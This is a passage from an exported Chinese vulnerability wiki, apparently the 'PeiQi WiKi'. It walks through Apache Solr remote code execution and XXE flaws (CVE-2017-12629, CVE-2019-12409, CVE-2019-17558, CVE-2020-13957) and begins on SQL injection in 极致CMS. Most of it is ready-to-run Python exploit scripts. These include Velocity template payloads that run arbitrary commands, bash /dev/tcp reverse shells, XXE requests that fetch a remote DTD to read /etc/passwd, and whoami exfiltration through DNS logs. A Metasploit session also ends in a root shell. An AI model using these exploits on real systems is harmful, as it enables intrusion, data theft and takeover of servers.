vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 20:10:57 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html","title":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d 漏洞复现 远程命令执行 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] 通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher 使用 postCommit 第一个请求包用于载入缓存中 [!NOTE] exe : ping 执行的命令 dir: 命令存在的目录位置 args:命令参数 如下请求包执行的是 /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } 第二个请求包用于更新缓存并执行命令 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] 注意 第一个请求包的这个位置 \"name\":\"newlistener-1\", listerer的名字需要替换，例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2 注意 第二个请求包的这个位置 [{\"id\":\"test\"}]， 同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2 注意 Content-Type: application/json 需要添加 不更改执行发生报错示例 进入docker容器查看发现命令已经执行 使用 newSearcher 使用 newSearcher可以直接加载入缓存执行命令 请求包如下 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearche\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[\"/tmp/vuln\"] } } [!NOTE] 注意点同上，也需要每次执行更改 \"name\":\"newlistener-2\" 的参数 成功执行了创建文件的命令 关于 如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行，请查看dnslog \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行 \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] 如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码 参考文章 Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测 cve-2017-12629 apache solr xxe & rce 漏洞分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-04 21:13:16 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html","title":"Apache Solr XXE 漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr XXE 漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。 影响版本 Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d 漏洞复现 Dnslog 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 访问 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml 查看dnslog得到请求 远程读取文件 在自己的服务器上写入一个可访问的XML文件，内容写入 \"> 然后请求这个文件来读取服务器上的文件 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] 注意这里的payload进行了url编码,请求的文件为 http://peiqi.tech/1.dtd，有更多需求自行更改写入的xml文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(读取/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") else: print(\"\\033[32m[o] 请查看dnslog响应 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-04 22:23:21 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html","title":"Apache Solr JMX服务 RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMX服务 RCE CVE-2019-12409 漏洞描述 Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。 影响版本 [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 环境搭建 下载 Apache Solr 8.2.0 也可以docker搭建 docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞 查看漏洞端口18983是否开放 [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/桌面# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id 用户id=0(root) 组id=0(root) 组=0(root) 漏洞修复 将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-05 16:34:35 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html","title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","keywords":"","body":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 漏洞描述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 影响版本 [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 环境搭建 选择一个存在漏洞的版本 下载各版本Solr地址 这里复现使用的是 Apache Solr 7.7.0 进行复现 下载后执行以下命令进行环境部署 cd solr-7.7.0 ./bin/solr start -e cloud -force 然后一路回车，直至出现 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip 将 vuln.zip 进行上传 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 POC使用详情参考另一篇复现文章 漏洞利用POC [!NOTE] 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-05 22:53:28 "},"PeiQi_Wiki/cms_wiki/":{"url":"PeiQi_Wiki/cms_wiki/","title":"CMS漏洞","keywords":"","body":"CMS 漏洞整理👻 极致CMS 极致CMS 全版本任意文件上传(后台权限) 极致CMS 存储型XSS 极致CMS 极致cms 1.71,1.7,1.67 版本 支付插件SQL注入 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-01 00:47:44 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/","title":"极致CMS","keywords":"","body":"极致CMS 极致CMS 全版本任意代码执行(后台权限) 极致CMS 1.71 ,1.7 ,1.67 版本 支付插件sql注入 极致CMS PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-01 12:24:37 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_全版本任意文件上传.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_全版本任意文件上传.html","title":"极致CMS 任意文件上传(后台权限)","keywords":"","body":"极致CMS_全版本任意文件(后台) 登陆后台查看插件处，有一个后台编辑的插件 安装之后设置密码并使用 [!NOTE] 如果已经设有密码，重新安装插件即可解决密码未知问题 修改为php代码 成功执行php代码的命令 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 14:35:16 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_1.71_1.7_1.67版本sql注入.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_1.71_1.7_1.67版本sql注入.html","title":"极致CMS 1.71 + 1.7 + 1.67 版本sql注入","keywords":"","body":"极致CMS_1.71_1.7_1.67版本sql注入(支付插件) 查看一下进行过滤的函数 /** 参数过滤，格式化 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://整数 return (int)$value; case 1://字符串 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://数组 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://浮点 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //过滤XSS攻击 function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } 看一下执行的SQL语句的函数 // 查询一条 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 跟进 findAll 函数 // 查询所有 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" 